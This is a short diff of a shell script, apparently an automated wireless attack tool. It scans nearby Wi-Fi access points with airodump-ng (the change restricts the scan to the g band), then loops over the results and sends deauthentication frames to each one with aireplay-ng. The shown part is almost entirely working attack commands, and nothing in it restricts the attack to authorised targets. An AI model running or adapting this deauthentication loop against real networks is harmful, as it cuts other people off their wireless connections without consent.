@@ -40,7 +40,7 @@ INDI=$!
 
 echo "------------------Starting Scan"
 
-	{ timeout -k 30 30 sudo airodump-ng -a -w my --output-format csv mon0;} &
+	{ timeout -k 30 30 sudo airodump-ng -a -w my --band g --output-format csv mon0;} &
 PID=$!
 
 # wait 30 seconds
@@ -100,7 +100,7 @@ do
 	PID=$!
 
 	#deauth
-	sudo aireplay-ng --deauth 15 -a "$f1" --ignore-negative-one mon0 
+	sudo aireplay-ng --deauth 15 -a "$f1" --ignore-negative-one mon0
 
  	sleep 10
 
